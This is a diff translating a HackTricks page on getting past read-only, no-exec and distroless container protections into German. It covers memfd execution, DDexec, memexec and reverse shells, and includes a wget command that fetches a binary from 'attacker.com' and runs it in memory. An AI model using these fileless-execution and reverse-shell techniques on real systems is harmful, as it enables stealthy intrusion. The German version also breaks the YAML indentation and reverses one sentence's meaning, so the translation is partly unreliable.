@@ -1,87 +1,85 @@
-# Bypass FS protections: read-only / no-exec / Distroless
+# Umgehung von FS-Schutzmaßnahmen: Nur-Lesen / Keine Ausführung / Distroless
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Andere Möglichkeiten, HackTricks zu unterstützen:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
+* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
 
 </details>
 
 ## Videos
 
-In the following videos you can find the techniques mentioned in this page explained more in depth:
+In den folgenden Videos finden Sie die auf dieser Seite erwähnten Techniken ausführlicher erklärt:
 
-* [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
-* [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
+* [**DEF CON 31 - Erforschung der Linux-Speicher-Manipulation für Stealth und Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
+* [**Stealth-Eindringungen mit DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
 
-## read-only / no-exec scenario
+## Nur-Lesen / Keine Ausführung Szenario
 
-It's more and more common to find linux machines mounted with **read-only (ro) file system protection**, specially in containers. This is because to run a container with ro file system is as easy as setting **`readOnlyRootFilesystem: true`** in the `securitycontext`:
+Es ist immer häufiger, Linux-Maschinen mit **Nur-Lesen (ro) Dateisystemschutz** zu finden, insbesondere in Containern. Dies liegt daran, dass das Ausführen eines Containers mit einem ro-Dateisystem so einfach ist wie das Festlegen von **`readOnlyRootFilesystem: true`** im `securitycontext`:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
 metadata:
-  name: alpine-pod
+name: alpine-pod
 spec:
-  containers:
-  - name: alpine
-    image: alpine
-    securityContext:
+containers:
+- name: alpine
+image: alpine
+securityContext:
 <strong>      readOnlyRootFilesystem: true
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-However, even if the file system is mounted as ro, **`/dev/shm`** will still be writable, so it's fake we cannot write anything in the disk. However, this folder will be **mounted with no-exec protection**, so if you download a binary here you **won't be able to execute it**.
+Auch wenn das Dateisystem als ro eingebunden ist, ist **`/dev/shm`** immer noch beschreibbar, daher können wir nichts auf die Festplatte schreiben. Dieser Ordner wird jedoch mit **Keine Ausführung-Schutz** eingebunden, sodass Sie, wenn Sie hier eine Binärdatei herunterladen, sie **nicht ausführen können**.
 
 {% hint style="warning" %}
-From a red team perspective, this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators like `kubectl`).
+Aus Sicht des Red Teams wird es dadurch **kompliziert, Binärdateien herunterzuladen und auszuführen**, die nicht bereits im System vorhanden sind (wie Backdoors oder Enumeratoren wie `kubectl`).
 {% endhint %}
 
-## Easiest bypass: Scripts
+## Einfachste Umgehung: Skripte
 
-Note that I mentioned binaries, you can **execute any script** as long as the interpreter is inside the machine, like a **shell script** if `sh` is present or a **python** **script** if `python` is installed.
+Beachten Sie, dass ich von Binärdateien gesprochen habe, Sie können jedoch **jedes Skript ausführen**, solange der Interpreter auf der Maschine vorhanden ist, wie ein **Shell-Skript**, wenn `sh` vorhanden ist, oder ein **Python-Skript**, wenn `python` installiert ist.
 
-However, this isn't just enough to execute your binary backdoor or other binary tools you might need to run.
+Dies reicht jedoch nicht aus, um Ihre Binärdatei-Backdoor oder andere Binärwerkzeuge auszuführen, die Sie möglicherweise ausführen müssen.
 
-## Memory Bypasses
+## Umgehung des Speichers
 
-If you want to execute a binary but the file system isn't allowing that, the best way to do so is by **executing it from memory**, as the **protections doesn't apply in there**.
+Wenn Sie eine Binärdatei ausführen möchten, das Dateisystem dies jedoch nicht zulässt, ist der beste Weg, dies zu tun, indem Sie es aus dem **Speicher heraus ausführen**, da die **Schutzmaßnahmen dort nicht gelten**.
 
-### FD + exec syscall bypass
+### FD + exec-Syscall-Umgehung
 
-If you have some powerful script engines inside the machine, such as **Python**, **Perl**, or **Ruby** you could download the binary to execute from memory, store it in a memory file descriptor (`create_memfd` syscall), which isn't going to be protected by those protections and then call a **`exec` syscall** indicating the **fd as the file to execute**.
+Wenn Sie leistungsstarke Skript-Engines auf der Maschine haben, wie **Python**, **Perl** oder **Ruby**, können Sie die Binärdatei zum Ausführen aus dem Speicher herunterladen, in einem Speicher-Dateideskriptor (`create_memfd`-Syscall) speichern, der nicht durch diese Schutzmaßnahmen geschützt wird, und dann einen **`exec`-Syscall** aufrufen, wobei der **fd als auszuführende Datei** angegeben wird.
 
-For this you can easily use the project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). You can pass it a binary and it will generate a script in the indicated language with the **binary compressed and b64 encoded** with the instructions to **decode and decompress it** in a **fd** created calling `create_memfd` syscall and a call to the **exec** syscall to run it.
+Hierfür können Sie das Projekt [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) verwenden. Sie können ihm eine Binärdatei übergeben und es wird ein Skript in der angegebenen Sprache generieren, in dem die Binärdatei mit den Anweisungen zum **Decodieren und Dekomprimieren** in einem mit `create_memfd`-Syscall erstellten **fd** **komprimiert und b64-codiert** wird und ein Aufruf des **exec**-Syscalls zum Ausführen.
 
 {% hint style="warning" %}
-This doesn't work in other scripting languages like PHP or Node because they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.
+Dies funktioniert nicht in anderen Skriptsprachen wie PHP oder Node, da sie keine **Standardmethode zum Aufrufen von Roh-Syscalls** aus einem Skript haben. Daher ist es nicht möglich, `create_memfd` aufzurufen, um den **Speicher-Dateideskriptor** zum Speichern der Binärdatei zu erstellen.
 
-Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.
+Darüber hinaus funktioniert das Erstellen eines **regulären Dateideskriptors** mit einer Datei in `/dev/shm` nicht, da Sie sie nicht ausführen dürfen, da der **Keine Ausführung-Schutz** angewendet wird.
 {% endhint %}
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is a technique that allows you to **modify the memory your own process** by overwriting its **`/proc/self/mem`**.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ist eine Technik, mit der Sie den Speicher Ihres eigenen Prozesses überschreiben können, indem Sie seinen **`/proc/self/mem`** überschreiben.
 
-Therefore, **controlling the assembly code** that is being executed by the process, you can write a **shellcode** and "mutate" the process to **execute any arbitrary code**.
+Daher können Sie, indem Sie den vom Prozess ausgeführten Assemblercode kontrollieren, einen **Shellcode** schreiben und den Prozess "mutieren", um **beliebigen Code** auszuführen.
 
 {% hint style="success" %}
-**DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.
+**DDexec / EverythingExec** ermöglicht das Laden und **Ausführen** Ihres eigenen **Shellcodes** oder **beliebiger Binärdateien** aus dem **Speicher**.
 {% endhint %}
-
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
-
-For more information about this technique check the Github or:
+Für weitere Informationen zu dieser Technik besuchen Sie Github oder:
 
 {% content-ref url="ddexec.md" %}
 [ddexec.md](ddexec.md)
@@ -89,54 +87,54 @@ For more information about this technique check the Github or:
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. It's a **DDexec shellcode demonised**, so every time that you want to **run a different binary** you don't need to relaunch DDexec, you can just run memexec shellcode via the DDexec technique and then **communicate with this deamon to pass new binaries to load and run**.
+[**Memexec**](https://github.com/arget13/memexec) ist der natürliche nächste Schritt von DDexec. Es handelt sich um einen **DDexec-Shellcode-Dämon**, sodass Sie jedes Mal, wenn Sie eine andere Binärdatei ausführen möchten, DDexec nicht neu starten müssen. Sie können einfach den Memexec-Shellcode über die DDexec-Technik ausführen und dann **mit diesem Dämon kommunizieren, um neue Binärdateien zum Laden und Ausführen zu übergeben**.
 
-You can find an example on how to use **memexec to execute binaries from a PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+Ein Beispiel, wie Sie **Memexec verwenden, um Binärdateien von einer PHP-Reverse-Shell auszuführen**, finden Sie unter [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
 
 ### Memdlopen
 
-With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique allows an **easier way to load binaries** in memory to later execute them. It could allow even to load binaries with dependencies.
+Mit einem ähnlichen Zweck wie DDexec ermöglicht die Technik [**Memdlopen**](https://github.com/arget13/memdlopen) eine einfachere Möglichkeit, Binärdateien im Speicher zu laden, um sie später auszuführen. Es könnte sogar ermöglichen, Binärdateien mit Abhängigkeiten zu laden.
 
-## Distroless Bypass
+## Distroless-Bypass
 
-### What is distroless
+### Was ist Distroless
 
-Distroless containers contain only the **bare minimum components necessary to run a specific application or service**, such as libraries and runtime dependencies, but exclude larger components like a package manager, shell, or system utilities.
+Distroless-Container enthalten nur die **minimalen Komponenten, die zum Ausführen einer bestimmten Anwendung oder eines bestimmten Dienstes erforderlich sind**, wie Bibliotheken und Laufzeitabhängigkeiten, aber größere Komponenten wie ein Paketmanager, eine Shell oder Systemdienstprogramme sind ausgeschlossen.
 
-The goal of distroless containers is to **reduce the attack surface of containers by eliminating unnecessary components** and minimising the number of vulnerabilities that can be exploited.
+Das Ziel von Distroless-Containern besteht darin, die Angriffsfläche von Containern zu **verkleinern, indem unnötige Komponenten eliminiert** und die Anzahl der ausnutzbaren Schwachstellen minimiert werden.
 
-### Reverse Shell
+### Reverse-Shell
 
-In a distroless container you might **not even find `sh` or `bash`** to get a regular shell. You won't also find binaries such as `ls`, `whoami`, `id`... everything that you usually run in a system.
+In einem Distroless-Container finden Sie möglicherweise **nicht einmal `sh` oder `bash`**, um eine normale Shell zu erhalten. Sie finden auch keine Binärdateien wie `ls`, `whoami`, `id`... alles, was Sie normalerweise in einem System ausführen.
 
 {% hint style="warning" %}
-Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.
+Daher können Sie keine **Reverse-Shell** erhalten oder das System wie gewohnt **enumerieren**.
 {% endhint %}
 
-However, if the compromised container is running for example a flask web, then python is installed, and therefore you can grab a **Python reverse shell**. If it's running node, you can grab a Node rev shell, and the same with mostly any **scripting language**.
+Wenn der kompromittierte Container beispielsweise eine Flask-Webanwendung ausführt, ist Python installiert und Sie können eine **Python-Reverse-Shell** erhalten. Wenn Node ausgeführt wird, können Sie eine Node-Rev-Shell erhalten, und dasselbe gilt für fast jede **Skriptsprache**.
 
 {% hint style="success" %}
-Using the scripting language you could **enumerate the system** using the language capabilities.
+Mit der Skriptsprache können Sie das System mithilfe der Sprachfunktionen **enumerieren**.
 {% endhint %}
 
-If there is **no `read-only/no-exec`** protections you could abuse your reverse shell to **write in the file system your binaries** and **execute** them.
+Wenn **kein `read-only/no-exec`-Schutz** vorhanden ist, können Sie Ihre Reverse-Shell missbrauchen, um Ihre Binärdateien im Dateisystem zu **schreiben** und **auszuführen**.
 
 {% hint style="success" %}
-However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.
+In dieser Art von Containern werden diese Schutzmaßnahmen jedoch in der Regel vorhanden sein, aber Sie können die **vorherigen Speicherausführungstechniken verwenden, um sie zu umgehen**.
 {% endhint %}
 
-You can find **examples** on how to **exploit some RCE vulnerabilities** to get scripting languages **reverse shells** and execute binaries from memory in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+Beispiele, wie Sie einige RCE-Schwachstellen ausnutzen können, um Skriptsprachen-**Reverse-Shells** zu erhalten und Binärdateien aus dem Speicher auszuführen, finden Sie unter [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Andere Möglichkeiten, HackTricks zu unterstützen:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen** möchten, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
+* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder folgen Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories senden**.
 
 </details>
